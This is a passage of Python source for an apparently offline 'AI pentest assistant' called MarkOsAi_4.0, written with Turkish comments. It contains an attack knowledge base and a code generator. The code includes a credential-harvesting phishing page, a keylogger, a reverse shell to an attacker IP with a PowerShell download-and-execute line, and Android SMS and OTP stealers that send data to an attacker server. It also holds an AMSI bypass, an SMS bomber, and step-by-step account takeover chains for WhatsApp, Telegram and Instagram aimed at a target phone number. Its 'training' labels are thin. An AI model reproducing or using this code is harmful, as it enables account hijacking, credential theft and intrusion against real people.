                "tools": ["netcat", "msfvenom + msfconsole", "socat", "python3"],
                "steps": [
                    "Dinleyici aç: nc -lvnp 4444 (veya msfconsole multi/handler).",
                    "Payload seç: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf",
                    "Windows: -p windows/x64/meterpreter/reverse_tcp -f exe",
                    "Hedefe ulaştır (phishing, upload zafiyeti, USB...).",
                    "Bağlantı gelince shell kontrol et; stabilite için python3 -c 'import pty...' ile TTY yükselt.",
                    "İşlem bitince oturumu kapat, izleri temizle.",
                ],
                "mitigation": "Egress filtreleme, AV/EDR, uygulama whitelisting, ağ segmentasyonu.",
                "commands": ["nc -lvnp 4444", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o s.elf",
                             "socat TCP:IP:4444 EXEC:sh"],
                "code_key": "reverse_shell",
            },
            "privesc": {
                "title": "Yetki Yükseltme (Privilege Escalation)",
                "summary": "Düşük yetkili kullanıcıdan root/administrator'a çıkma teknikleri.",
                "keywords": [("yetki yükselt", 7), ("privesc", 6), ("privilege escalation", 6), ("root al", 6), ("sudo", 4), ("suid", 5), ("linpeas", 5)],
                "tools": ["linpeas.sh", "winpeas.exe", "GTFOBins (sudo/SUID)", "pspy", "LSE"],
                "steps": [
                    "Sistem bilgisi: uname -a, cat /etc/os-release.",
                    "linpeas çalıştır: ./linpeas.sh → ilginç çıktıları incele.",
                    "sudo hakları: sudo -l → GTFOBins'ten kaçış dene (sudo vim, sudo python...).",
                    "SUID dosyalar: find / -perm -4000 2>/dev/null → GTFOBins eşleştir.",
                    "Cron görevleri: yazılabilir script'leri kontrol et (pspy ile izle).",
                    "Kernel exploit: searchsploit <kernel sürümü> (güncel değilse).",
                ],
                "mitigation": "Yamalama, least-privilege, sudoers sınırlama, SUID kaldırma.",
                "commands": ["curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                             "sudo -l", "find / -perm -4000 2>/dev/null"],
                "code_key": "reverse_shell",
            },
            "malware": {
                "title": "Zararlı Yazılım (Malware) Analizi",
                "summary": "Trojan, stealer ve FUD konseptleri; savunma açısından inceleme metodolojisi.",
                "keywords": [("malware", 6), ("zararlı", 5), ("trojan", 6), ("virüs", 5), ("fud", 5), ("stealer", 5), ("crypter", 4)],
                "tools": ["msfvenom", "Veil", "TheFatRat", "upx (packer)", "VirusTotal (analiz)", "Cuckoo (sandbox)"],
                "steps": [
                    "Payload üret: msfvenom (AV'ye yakalanmama için packer/obfuscation ekle).",
                    "FUD testi: VirusTotal'de tespit oranını ölç (eğitim için).",
                    "Dağıtım: phishing eki, USB, drive-by download.",
                    "Analiz (savunma): Cuckoo sandbox'ta davranış analizi, strings, PE-bear.",
                    "Kalıcılık: registry (Windows) / crontab (Linux) — tespit için önemli.",
                ],
                "mitigation": "AV/EDR, uygulama kontrolü, e-posta filtreleme, kullanıcı eğitimi.",
                "commands": ["msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -e x64/xor -o p.exe",
                             "upx -9 p.exe", "# VirusTotal API analiz", "curl -X POST -F file=@p.exe https://www.virustotal.com/api/v3/files -H 'x-apikey: KEY'"],
                "code_key": "reverse_shell",
            },
            "keylogger": {
                "title": "Keylogger",
                "summary": "Tuş vuruşlarını kaydeden yazılım; donanımsal ve yazılımsal türleri.",
                "keywords": [("keylogger", 7), ("tuş kaydedici", 6), ("tuşları kaydet", 5), ("klavye dinle", 5)],
                "tools": ["pynput (Python)", "Windows GetAsyncKeyState API", "Donanım keylogger (USB)"],
                "steps": [
                    "Python: pynput.keyboard.Listener ile tuşları yakala.",
                    "Logları dosyaya/HTTP'e gönder (exfil).",
                    "Windows API: GetAsyncKeyState döngüsü (C/C++).",
                    "Kalıcılık: startup klasörü / registry Run key.",
                    "AV'den kaçınma: obfuscate + pack (eğitim).",
                ],
                "mitigation": "AV/EDR, tuş takımı izleme, donanım portları kontrolü, ekran klavyesi (hassas alanlar).",
                "commands": ["pip install pynput", "# log çıktısı", "cat keylog.txt"],
                "code_key": "keylogger",
            },
            "rat": {
                "title": "RAT — Uzaktan Erişim Truva Atı",
                "summary": "Hedef makineyi uzaktan kontrol eden yazılım; kamera, dosya, shell kontrolü.",
                "keywords": [("rat", 6), ("uzaktan erişim", 6), ("remote access", 5), ("c2", 5), ("komut kontrol", 4)],
                "tools": ["Metasploit (meterpreter)", "Covenant / Sliver (C2)", "Empire", "TheFatRat"],
                "steps": [
                    "Stager üret: msfvenom reverse_tcp stager.",
                    "C2 kur: msfconsole multi/handler veya Sliver.",
                    "Hedefe ulaştır ve çalıştır.",
                    "Meterpreter: sysinfo, screenshot, webcam_snap, download/upload, shell.",
                    "Kalıcılık: persistence_exe, autorun (metasploit modülleri).",
                    "Erişimi doğrula, tespit için logları incele (savunma perspektifi).",
                ],
                "mitigation": "EDR + davranış analizi, ağ segmentasyonu, egress filtreleme.",
                "commands": ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o r.exe",
                             "msfconsole -q -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST IP; run'"],
                "code_key": "reverse_shell",
            },
            "evasion": {
                "title": "Antivirüs / EDR Bypass",
                "summary": "İmza tabanlı ve davranışsal tespitleri aşma teknikleri (yetkili testler için).",
                "keywords": [("bypass", 6), ("antivirüs atlat", 6), ("edr", 5), ("amsi", 6), ("evasion", 6), ("tespit", 4), ("powershell bypass", 5)],
                "tools": ["PowerShell (AMSI bypass)", "msfvenom encoders", "upx", "Veil", "ScareCrow", "Shellter"],
                "steps": [
                    "AMSI bypass: ilk satırda AMSI'yi kapat (Reflection ile patch).",
                    "PowerShell obfuscation: -enc base64, string parçalama, Invoke-Obfuscation.",
                    "Packer: upx ile payload sıkıştır (imza değişir).",
                    "Living-off-the-land: powershell.exe, mshta, rundll32 ile yükleme.",
                    "Process injection: CreateRemoteThread / APC (C++ örnek).",
                    "Tespit testi: Defender / EDR loglarını incele (savunma tarafı).",
                ],
                "mitigation": "EDR davranış analizi, AMSI zorunlu, applocker, log merkezi (SIEM).",
                "commands": ["powershell -enc <base64>", "Invoke-Obfuscation", "# AMSI bypass (eğitim)", "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""],
                "code_key": "reverse_shell",
            },
            "anonymous": {
                "title": "Anonimlik / İz Bırakmama",
                "summary": "Tor, proxychains, MAC spoofing ve opsec kuralları ile iz yönetimi.",
                "keywords": [("anonim", 6), ("tor", 5), ("proxy", 5), ("vpn", 4), ("iz bırakma", 5), ("opsec", 5), ("mac değiş", 4), ("izini gizle", 5)],
                "tools": ["Tor Browser / tor", "proxychains", "MACchanger", "Tails OS", "VPN (log tutmayan)"],
                "steps": [
                    "Tails boot et veya Tor Browser kullan (en güvenli varsayılan).",
                    "proxychains: tüm araçları Tor üzerinden yönlendir (nmap, curl).",
                    "MAC spoof: macchanger -r wlan0 (ağ seviyesi iz bırakma).",
                    "DNS sızıntısı kontrolü: dnsleaktest.",
                    "Opsec: gerçek kimlik bilgisi kullanma, aynı hesaba giriş yapma, zaman dilimi tutarlılığı.",
                    "İş bitince tüm logları temizle: history -c, rm log dosyaları, shred.",
                ],
                "mitigation": "Kurumsal: egress filtreleme, DNS logging, Tor trafiği tespiti.",
                "commands": ["proxychains nmap -sT -Pn hedef.com", "macchanger -r eth0", "tor &", "shred -u dosya.txt"],
            },
            "crypto": {
                "title": "Kriptografi / Hash Araçları",
                "summary": "Hash üretimi, base64, openssl şifreleme ve şifre hash analizi.",
                "keywords": [("şifrele", 5), ("encrypt", 5), ("hash", 5), ("sha", 4), ("md5", 4), ("base64", 5), ("openssl", 4), ("kripto", 4)],
                "tools": ["openssl", "hashcat", "xxd", "python3 (hashlib/base64)"],
                "steps": [
                    "Hash üret: echo -n 'metin' | md5sum / sha256sum.",
                    "Base64: echo 'metin' | base64 / base64 -d.",
                    "AES şifreleme: openssl enc -aes-256-cbc -salt -in dosya -out dosya.enc.",
                    "Zayıf hash tespiti: hashcat mode listesinden türü bul.",
                    "Salt kontrolü: aynı şifre → farklı hash olmalı (bcrypt/argon2 tercih).",
                ],
                "mitigation": "bcrypt/argon2, tuzlama, uzun anahtar, donanım HSM.",
                "commands": ["echo -n 'x' | sha256sum", "openssl enc -aes-256-cbc -salt -in f -out f.enc -k sifre",
                             "base64 <<< 'metin'"],
                "code_key": "hashcat",
            },
            "recon": {
                "title": "Keşif / Port Tarama (Recon)",
                "summary": "Nmap, alt alan adı keşfi, dizin fuzzing ve servis tespiti ile yüzey haritalama.",
                "keywords": [("nmap", 6), ("port tarama", 6), ("keşif", 5), ("recon", 5), ("subdomain", 5), ("dizin", 4), ("gobuster", 5), ("fuzz", 4)],
                "tools": ["nmap", "sublist3r / amass", "gobuster / ffuf", "nikto", "whatweb", "dnsrecon"],
                "steps": [
                    "Host keşfi: nmap -sn 10.10.0.0/24 (pingsiz: -Pn).",
                    "Port tarama: nmap -sS -sV -O hedef (sürüm + OS).",
                    "Varsayılan script: nmap -sC hedef (vuln, banner).",
                    "Alt alan adları: sublist3r -d hedef.com; amass enum.",
                    "Dizin fuzz: gobuster dir -u http://hedef -w common.txt.",
                    "Web analizi: whatweb, nikto, robots.txt, kaynak kodu.",
                ],
                "mitigation": "Gereksiz portları kapat, servisleri güncelle, WAF, API rate-limit.",
                "commands": ["nmap -sV -sC -O hedef.com", "gobuster dir -u http://hedef -w /usr/share/wordlists/dirb/common.txt",
                             "sublist3r -d hedef.com", "nikto -h http://hedef"],
                "code_key": "nmap",
            },
            "ddos": {
                "title": "DDoS / DoS Stres Testi",
                "summary": "SYN flood, UDP flood, slowloris ve HTTP flood teknikleri (yetkili testler için).",
                "keywords": [("ddos", 6), ("dos saldırı", 6), ("flood", 5), ("slowloris", 6), ("syn", 4), ("hping3", 5)],
                "tools": ["hping3", "slowloris (Python)", "mdk3 (WiFi)", "LOIC/HOIC (sadece eğitim)", "GoldenEye"],
                "steps": [
                    "SYN flood: hping3 -S --flood -p 80 hedef.",
                    "UDP flood: hping3 -2 --flood hedef.",
                    "Slowloris: bağlantıları yarım bırak (slowloris hedef.com).",
                    "HTTP flood: paralel GET istekleri (Python/GO).",
                    "Ölç: yanıt süresi, paket kaybı (ping -f).",
                    "Rapor: etki süresi, savunma boşlukları.",
                ],
                "mitigation": "CDN/WAF (Cloudflare), rate-limit, SYN cookie, bant genişliği fazlalığı.",
                "commands": ["hping3 -S --flood -p 80 hedef", "slowloris hedef.com", "# mdk3 (WiFi DoS)", "mdk3 wlan0mon a -a BSSID"],
            },
            "session": {
                "title": "Oturum / Cookie Saldırıları",
                "summary": "Session fixation, cookie hırsızlığı ve hijack teknikleri.",
                "keywords": [("session", 6), ("oturum", 5), ("cookie", 6), ("token çal", 5), ("hijack", 5), ("fixation", 5)],
                "tools": ["Burp Suite", "BeEF", "Tamper Data", "Cookie-Editor (test)"],
                "steps": [
                    "Cookie özelliklerini incele: HttpOnly, Secure, SameSite eksikleri.",
                    "XSS ile cookie exfil dene (HttpOnly yoksa).",
                    "Session fixation: oturum ID'sini önceden belirleme testi.",
                    "Token tahmin: zayıf rastgelelik analizi (Burp sequencer).",
                    "Hijack: çalınan cookie'yi başka tarayıcıda kullan (test).",
                ],
                "mitigation": "HttpOnly + Secure + SameSite, oturum ID rotasyonu, güçlü rastgelelik.",
                "commands": ["# BeEF hook ile cookie çekme", "<script src='http://IP:3000/hook.js'></script>"],
                "code_key": "phishing_page",
            },
            "mitm": {
                "title": "MITM — Ortadaki Adam",
                "summary": "ARP spoofing, SSL strip ve trafik dinleme teknikleri.",
                "keywords": [("mitm", 6), ("ortadaki adam", 6), ("arp spoof", 6), ("ettercap", 5), ("bettercap", 5), ("dinleme", 4), ("ssl strip", 5)],
                "tools": ["bettercap", "ettercap", "arpspoof + dsniff", "Wireshark", "mitmproxy"],
                "steps": [
                    "IP forwarding aç: echo 1 > /proc/sys/net/ipv4/ip_forward.",
                    "ARP spoof: bettercap veya arpspoof -i eth0 -t hedef -r gateway.",
                    "Trafiği yakala: Wireshark / tshark canlı izle.",
                    "SSL strip: mitmproxy ile HTTPS'ten bilgi çekmeyi dene (eğitim).",
                    "Kimlik bilgileri düşerse raporla; hedefe HTTPS/HSTS öner.",
                ],
                "mitigation": "HSTS, sertifika sabitleme, VLAN izolasyonu, port güvenliği (DAI).",
                "commands": ["echo 1 > /proc/sys/net/ipv4/ip_forward", "arpspoof -i eth0 -t HEDEF GW",
                             "bettercap -eval 'set arp.spoof.targets HEDEF; arp.spoof on'"],
            },
            "metasploit": {
                "title": "Metasploit Framework",
                "summary": "Exploit modülleri, payload üretimi ve post-exploitation iş akışı.",
                "keywords": [("metasploit", 7), ("msf", 6), ("msfvenom", 6), ("meterpreter", 5), ("exploit", 4)],
                "tools": ["msfconsole", "msfvenom", "searchsploit", "Metasploit Community"],
                "steps": [
                    "Başlat: msfconsole.",
                    "Ara: search <servis/versiyon> (ör: search apache).",
                    "Modül seç: use exploit/multi/http/...",
                    "Ayarla: set RHOSTS, set LHOST, set PAYLOAD.",
                    "Çalıştır: run → oturum gelirse sessions -i 1.",
                    "Post-exploitation: getsystem (windows), shell, download.",
                ],
                "mitigation": "Yamalama, exploit tespiti (IDS), ağ segmentasyonu.",
                "commands": ["msfconsole", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o m.elf",
                             "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run"],
                "code_key": "reverse_shell",
            },
            "burp": {
                "title": "Burp Suite Kullanımı",
                "summary": "Web trafiğini yakalama, değiştirme ve otomatik test (repeater, intruder, scanner).",
                "keywords": [("burp", 6), ("proxy yakala", 5), ("intercept", 5), ("repeater", 5), ("intruder", 5), ("web test", 4)],
                "tools": ["Burp Suite Community/Pro", "FoxyProxy (tarayıcı eklentisi)", "CA sertifikası"],
                "steps": [
                    "Proxy'yi ayarla: 127.0.0.1:8080, tarayıcıya FoxyProxy ekle.",
                    "CA sertifikasını yükle (HTTPS yakalama için).",
                    "Intercept: isteği yakala, değiştir, forward et.",
                    "Repeater: isteği tekrarla, parametreleri elle değiştir (SQLi/XSS test).",
                    "Intruder: sözlük saldırısı (brute force, IDOR, fuzz).",
                    "Scanner (Pro): otomatik zafiyet taraması.",
                ],
                "mitigation": "WAF, girdi doğrulama, rate-limit (intruder'a karşı).",
                "commands": ["# Burp'ı CLI ile başlat", "burpsuite"],
                "code_key": "sqli_fuzz",
            },
        }

    # ═══════════════════════════ KOD KÜTÜPHANESİ ═══════════════════════════
    def _build_code_lib(self):
        return {
            "phishing_page": """# ═══ Sahte Login Sayfası (Eğitim) — HTML + PHP ═══
# index.html — target platformun klonlanmış formu
<html>
<body>
  <h2>Güvenli Giriş</h2>
  <form method="POST" action="capture.php">
    <input type="text" name="email" placeholder="E-posta / Telefon" required>
    <input type="password" name="pass" placeholder="Şifre" required>
    <button type="submit">Giriş</button>
  </form>
</body>
</html>

# capture.php — kimlik bilgilerini loglar
<?php
$log = fopen("log.txt", "a");
fwrite($log, date("Y-m-d H:i:s") . " | " . $_POST['email'] . " | " . $_POST['pass'] . " | " . $_SERVER['REMOTE_ADDR'] . "\\n");
fclose($log);
header("Location: https://gercek-platform.com");
?>

# Test: php -S 0.0.0.0:80  +  ngrok http 80
# 2FA yakalamak için evilginx2 kullan (reverse proxy)""",

            "keylogger": """# ═══ Python Keylogger (Eğitim) ═══
# pip install pynput
from pynput import keyboard
import datetime

LOG = "keylog.txt"

def on_press(key):
    try:
        ch = key.char
    except AttributeError:
        ch = f"<{key}>"
    with open(LOG, "a") as f:
        f.write(f"{datetime.datetime.now()} - {ch}\\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Exfil için: log'u HTTP POST ile gönder (requests)""",

            "reverse_shell": """# ═══ Python Reverse Shell (Eğitim) ═══
# Kullanım: python3 shell.py  →  hedef makinede çalıştır
# Dinle: nc -lvnp 4444
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("IP_BURAYA", 4444))   # ← saldırgan IP
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

# Windows alternatifi: powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')"
# TTY yükselt: python3 -c 'import pty; pty.spawn("/bin/bash")'""",

            "sms_forwarder": """# ═══ Android SMS Yönlendirici (Eğitim) — Java ═══
# AndroidManifest.xml içine:
# <uses-permission android:name="android.permission.RECEIVE_SMS"/>
# <uses-permission android:name="android.permission.INTERNET"/>

# SMSReceiver.java
public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        for (SmsMessage msg : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
            String body = msg.getMessageBody();      // ← OTP burada
            String sender = msg.getOriginatingAddress();
            // exfil: HTTP POST ile saldırgan sunucuya gönder
            new Thread(() -> {
                try {
                    URL u = new URL("http://SALDIRGAN/sms?sender=" + sender + "&body=" + body);
                    u.openConnection().getInputStream();
                } catch (Exception e) {}
            }).start();
        }
    }
}
# Not: Android 4.4+ varsayılan SMS uygulaması dışındaki uygulamalar
# mesajı Okuyamaz — bu yüzden OTP okuyucular Accessibility/Notification kullanır.""",

            "otp_reader": """# ═══ Android OTP Okuyucu (Eğitim) — NotificationListener ═══
# NotificationListenerService ile bildirimden OTP çekme konsepti
public class OTPListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (pkg.contains("whatsapp") || pkg.contains("telegram")) {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text  = extras.getString(Notification.EXTRA_TEXT, "");
            // OTP'yi regex ile çek: \b\\d{5,6}\b
            Pattern p = Pattern.compile("\\\\b\\\\d{5,6}\\\\b");
            Matcher m = p.matcher(text);
            if (m.find()) {
                // exfil: HTTP POST → SALDIRGAN/otp?code=<kod>
            }
        }
    }
}
# Kullanıcı "Bildirim erişimi" izni vermelidir → sosyal mühendislik vektörü""",

            "sqli_fuzz": """# ═══ SQLi Fuzz Tarayıcı (Eğitim) ═══
import requests

url = "http://HEDEF/page.php"
params = {"id": "1"}
payloads = ["'", "1'-- -", "1' OR '1'='1", "1 UNION SELECT 1,2,3-- -",
            "1' AND SLEEP(5)-- -", "1\" OR \"1\"=\"1"]

for p in payloads:
    params["id"] = p
    try:
        r = requests.get(url, params=params, timeout=10)
        if "sql" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower():
            print(f"[!] SQL hatası: {p}")
        elif r.elapsed.total_seconds() > 4.5:
            print(f"[!] Time-based gecikme: {p}")
    except Exception as e:
        print(f"[-] Hata: {e}")

# Profesyonel: sqlmap -u 'http://HEDEF/page.php?id=1' --dbs""",

            "wifi_deauth": """# ═══ WiFi Handshake Yakalama (Eğitim) — Bash ═══
sudo airmon-ng check kill
sudo airmon-ng start wlan0          # wlan0mon oluşur
sudo airodump-ng wlan0mon           # hedef BSSID + kanal bul
# Hedefi seç: (kanal CH, BSSID)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# Yeni terminal — istemciyi kopar (handshake için):
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Handshake yakalanınca kır:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap
# PMKID yöntemi (client gerektirmez):
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
sudo hcxpcapngtool pmkid.pcapng -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt""",

            "hashcat": """# ═══ Hashcat Komutları (Eğitim) ═══
# Modlar: 0=MD5 100=SHA1 1400=SHA256 22000=WPA-PMKID 3200=bcrypt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d        # brute force 6 rakam
hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d    # wordlist+sonek
hashcat --show hash.txt                          # kırılanları göster
# John alternatifi:
john --wordlist=rockyou.txt hash.txt
john --show hash.txt""",

            "nmap": """# ═══ Nmap Komut Seti (Eğitim) ═══
nmap -sn 10.10.0.0/24                    # host keşfi
nmap -sS -Pn -p- HEDEF                  # tüm portlar (SYN)
nmap -sV -sC -O HEDEF                   # servis + script + OS
nmap -sU --top-ports 100 HEDEF          # UDP tarama
nmap -p 80,443 --script http-vuln-* HEDEF  # web zafiyet scriptleri
nmap -p 22 --script ssh-brute HEDEF     # SSH brute (eğitim)
nmap --script vuln HEDEF                # bilinen zafiyetler
# Çıktı: -oA rapor  (xml/gnmap/nmap)""",

            "sms_bomber": """# ═══ SMS Bomber — Stres Test (Eğitim) ═══
# Gerçek API'lere spam YASAK — yalnızca kendi test uçlarında kullan!
import requests, threading, time

TARGET = "HEDEF_NUMARA"
ENDPOINTS = [
    "https://hedef-api-1.com/send",   # ← kendi test servislerin
    "https://hedef-api-2.com/otp",
]

def send(i, ep):
    try:
        requests.post(ep, data={"phone": TARGET, "msg": f"Kod: {100000+i}"}, timeout=3)
        print(f"[+] {i} -> {ep}")
    except Exception:
        pass

for i in range(20):
    t = threading.Thread(target=send, args=(i, ENDPOINTS[i % len(ENDPOINTS)]))
    t.start()
    time.sleep(0.2)

# Alternatif: proselan/arkesel gibi gerçek SMS API'leriyle
# KENDİ numarana yalnızca 5-10 mesaj göndererek test et.""",
        }

    # ═══════════════════════════ ATAK ZİNCİRLERİ ═══════════════════════════
    def _build_chains(self):
        return {
            "whatsapp": {
                "title": "WhatsApp Hesap Ele Geçirme (Yetkili Test)",
                "phases": [
                    {"name": "Keşif / OSINT", "steps": [
                        "Hedef numaranın WhatsApp kaydını doğrula",
                        "E-posta / sosyal medya bağlantılarını çıkar (holehe, sherlock)",
                        "Operatör ve taşıma durumunu öğren"]},
                    {"name": "Doğrulama Vektörü", "steps": [
                        "Sanal numara + SMS hizmeti ile kendi numaranı üret (5sim/sms-activate)",
                        "SS7 / SIM swap imkânını değerlendir",
                        "Voice OTP yedeğini test et"]},
                    {"name": "OTP Yakalama", "steps": [
                        "Notification/accessibility vektörü dene (kendi cihazında)",
                        "Evilginx2 ile 2FA phishing simülasyonu kur",
                        "Yakalanan kodu hemen kullan (30sn)"]},
                    {"name": "Erişim + Doğrulama", "steps": [
                        "Hesaba gir, 2 adımı devre dışı bırakma (fark edilir)",
                        "Linked devices'ı listele ve oturumu doğrula",
                        "Loglarını al, test raporu yaz"]},
                ],
                "cleanup": "Test oturumunu kapat, hedefe bildir, logları rapora ekle.",
            },
            "telegram": {
                "title": "Telegram Hesap Testi",
                "phases": [
                    {"name": "Ön Keşif", "steps": [
                        "Hedef kullanıcı adı / numara ile hesap varlığını doğrula",
                        "Cloud şifre zayıflığı için profil ipuçlarını topla"]},
                    {"name": "Giriş Kodu", "steps": [
                        "SMS giriş kodunu SS7/SIM swap ile yakalamayı dene",
                        "Rate-limit ve brute force toleransını ölç (5 haneli kod)"]},
                    {"name": "Oturum", "steps": [
                        "tdata/session dosyalarını çıkar (cihaz erişimin varsa)",
                        "API ile oturum aç, session'ı klonla"]},
                    {"name": "Rapor", "steps": [
                        "Erişilen verileri listele, güvenlik önerisi sun"]},
                ],
                "cleanup": "Oturumu kapat, cihaz değişikliğini bildir.",
            },
            "instagram": {
                "title": "Instagram / Facebook Hesap Testi",
                "phases": [
                    {"name": "Keşif", "steps": [
                        "Kullanıcı adı → e-posta/telefon bağlantısı (holehe)",
                        "Şifre sıfırlama akışını analiz et (hangi bilgi isteniyor)"]},
                    {"name": "Kimlik Bilgisi", "steps": [
                        "Klon login sayfası kur (ngrok + capture.php)",
                        "Smishing/e-posta ile kurbanı yönlendir (eğitim ortamı)"]},
                    {"name": "2FA / Oturum", "steps": [
                        "Evilginx2 ile OTP yakala veya cookie çal",
                        "c_user+xs cookie'lerini tarayıcıda kullan"]},
                    {"name": "Doğrulama", "steps": [
                        "Erişimi kanıtla (ekran görüntüsü), güvenlik açığını raporla"]},
                ],
                "cleanup": "Kurbanın şifresini değiştir, tüm phishing altyapısını kapat.",
            },
            "generic": {
                "title": "Genel Telefon/Platform Testi",
                "phases": [
                    {"name": "Keşif", "steps": [
                        "Numara OSINT (phoneinfoga, sosyal arama)",
                        "Platform varlık tespiti (WhatsApp/Telegram/IG)"]},
                    {"name": "Vektör Seçimi", "steps": [
                        "Sanal numara / SMS hizmeti ile kayıt testi",
                        "SS7 / SIM swap risk değerlendirmesi",
                        "Phishing / sosyal mühendislik simülasyonu"]},
                    {"name": "Uygulama", "steps": [
                        "Seçilen vektörü uygula, OTP'yi yakala",
                        "Erişimi doğrula, kanıt topla"]},
                    {"name": "Raporlama", "steps": [
                        "CVSS benzeri risk skoru ver, düzeltme öner"]},
                ],
                "cleanup": "Tüm test izlerini temizle, hedefi bilgilendir.",
            },
        }


# ═══════════════════════════ HEDEF ANALİZİ ═══════════════════════════
def target_analysis():
    print(f"\n{B}{CYAN}═══ HEDEF ANALİZİ ═══{R}")
    platform = input("Hedef platform (WhatsApp/Telegram/Instagram/...): ").strip()
    phone = input("Hedef numara: ").strip()

    ai = MarkOsAI()
    intent = ai.detect_intent(platform)
    risk = 85 if "whatsapp" in platform.lower() else 70 if "telegram" in platform.lower() else 75
    out = [f"\n{RED}{'═' * 50}{R}",
           f"{B}{RED}🎯 HEDEF ANALİZ RAPORU{R}",
           f"  Platform   : {YELLOW}{platform}{R}",
           f"  Numara     : {YELLOW}{phone}{R}",
           f"  Risk Skoru : {RED}{risk}/100{R}",
           f"\n{B}Olası vektörler:{R}"]
    if intent and intent in ai.KB:
        for i, s in enumerate(ai.KB[intent]["steps"][:4], 1):
            out.append(f"  {i}. {s}")
    else:
        out.append("  • SS7 SMS intercept")
        out.append("  • SIM swap")
        out.append("  • Phishing / 2FA proxy")
        out.append("  • Sosyal mühendislik")
    out.append(f"\n{B}{GREEN}Korunma:{R}")
    if intent and intent in ai.KB:
        out.append(f"  {ai.KB[intent]['mitigation']}")
    out.append(f"{RED}{'═' * 50}{R}")
    print("\n".join(out))
    input(f"\n{YELLOW}[ENTER] Ana menüye dön{R}")


# ═══════════════════════════ ANA MENÜ ═══════════════════════════
def main_menu():
    ai = MarkOsAI()

    while True:
        clear()
        print(f"""{RED}
╔══════════════════════════════════════════════════════════╗
║{R}{B}               MarkOsAi_4.0 — AI PENTEST ASSISTANT{R}{RED}            ║
║{R}      HackerAI tarzı offline yapay zeka asistanı{R}{RED}                  ║
╚══════════════════════════════════════════════════════════╝{R}

  {GREEN}[1]{R}  💬 Sohbet — MarkOsAi'ya her şeyi sor
  {GREEN}[2]{R}  🎯 Hedef Analizi (platform + numara)
  {GREEN}[3]{R}  ⚡ Atak Zinciri Üretici
  {GREEN}[4]{R}  🔧 Araç + Kali Komut Önerileri
  {GREEN}[5]{R}  💻 Kod Üretici (phishing, keylogger, shell...)
  {GREEN}[6]{R}  📚 Bilgi Tabanı (tüm konular)
  {GREEN}[7]{R}  🧠 Hafıza / Öğrenme Geçmişi
  {RED}[0]{R}  Çıkış
""")

        secim = input(f"{BLUE}[?]{R} Seçim: ").strip()

        if secim == "1":
            clear()
            ai.interactive_chat()
        elif secim == "2":
            clear()
            target_analysis()
        elif secim == "3":
            clear()
            print(f"\n{B}Atak zinciri için konu seç:{R}")
            print(f"  {GREEN}1.{R} whatsapp   {GREEN}2.{R} telegram   {GREEN}3.{R} instagram   {GREEN}4.{R} genel")
            t = input(f"{BLUE}[?]{R} Konu: ").strip().lower()
            topic = {"1": "whatsapp", "2": "telegram", "3": "instagram", "4": "generic"}.get(t, t)
            print(ai.attack_chain(topic))
            input(f"\n{YELLOW}[ENTER] Devam{R}")
        elif secim == "4":
            clear()
            print(f"\n{B}Konu yaz (örn: whatsapp, wifi, sqli, otp):{R}")
            topic = ai.detect_intent(input(f"{BLUE}[?]{R} Konu: "))
            if topic:
                print(ai.tool_suggestions(topic))
            else:
                print(f"{YELLOW}Konu bulunamadı.{R}")
            input(f"\n{YELLOW}[ENTER] Devam{R}")
        elif secim == "5":
            clear()
            print(f"\n{B}Hangi kodu istersin?{R}")
            print("  phishing | keylogger | reverse_shell | sms_forwarder | otp_reader")
            print("  sqli_fuzz | wifi_deauth | hashcat | nmap | sms_bomber")
            t = input(f"{BLUE}[?]{R} Kod: ").strip()
            print(ai.get_code(t))
            input(f"\n{YELLOW}[ENTER] Devam{R}")
        elif secim == "6":
            clear()
            print(f"\n{B}{CYAN}═══ BİLGİ TABANI — {len(ai.KB)} KONU ═══{R}\n")
            names = list(ai.KB.keys())
            for i in range(0, len(names), 3):
                row = names[i:i + 3]
                print("   ".join(f"{GREEN}{n:<16}{R}" for n in row))
            topic = input(f"\n{BLUE}[?]{R} Konu seç: ").strip().lower()
            if topic in ai.KB:
                print(ai.format_topic(topic))
            else:
                intent = ai.detect_intent(topic)
                if intent:
                    print(ai.format_topic(intent))
                else:
                    print(f"{YELLOW}Konu bulunamadı.{R}")
            input(f"\n{YELLOW}[ENTER] Devam{R}")
        elif secim == "7":
            clear()
            print(ai.history_text())
            input(f"\n{YELLOW}[ENTER] Devam{R}")
        elif secim == "0":
            print(f"\n{GREEN}MarkOsAi_4.0 kapatılıyor. Bellek kaydedildi.{R}")
            break


# ═══════════════════════════ GİRİŞ ═══════════════════════════
